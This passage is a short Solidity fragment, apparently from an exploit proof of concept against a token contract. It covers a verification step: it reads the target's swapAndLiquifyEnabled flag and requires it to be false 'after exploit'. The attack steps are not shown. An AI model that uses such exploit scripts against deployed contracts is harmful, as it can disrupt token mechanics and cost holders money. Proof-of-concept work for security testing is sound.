        // Step 3: Verify the state was changed
        // Read the public variable swapAndLiquifyEnabled
        (bool readSuccess, bytes memory data) = TARGET.staticcall(abi.encodeWithSignature("swapAndLiquifyEnabled()"));
        require(readSuccess, "Failed to read swapAndLiquifyEnabled");
        bool enabled = abi.decode(data, (bool));
        require(!enabled, "swapAndLiquifyEnabled should be false after exploit");

